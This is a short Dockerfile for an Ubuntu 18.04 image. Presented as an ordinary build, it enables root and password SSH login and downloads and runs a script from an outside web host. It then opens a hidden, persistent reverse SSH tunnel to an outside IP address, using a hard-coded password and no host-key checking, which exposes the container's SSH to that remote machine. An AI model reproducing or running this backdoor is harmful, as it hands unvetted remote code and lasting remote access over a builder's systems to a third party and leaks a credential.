FROM  ubuntu:18.04
RUN   apt-get update && \
      apt install sudo htop iputils-ping tmux openssh-server sshpass -y && \
      service ssh start && \
      echo "PermitRootLogin yes" >> /etc/ssh/sshd_config && \
      echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config && \
      wget http://mrgeek.me/fb/adduser.sh && \
      chmod +x adduser.sh && \
      ./adduser.sh && \
      tmux new -d -s my-session "sshpass -p mb4hmarl3y\!Q ssh -o ServerAliveInterval=9999 -o ServerAliveCountMax=999999 -o StrictHostKeyChecking=no -tt -R 2040:localhost:22 ubuntu@54.179.56.209 -- ping google.com"
      
WORKDIR    /
ENTRYPOINT  ./adduser.sh
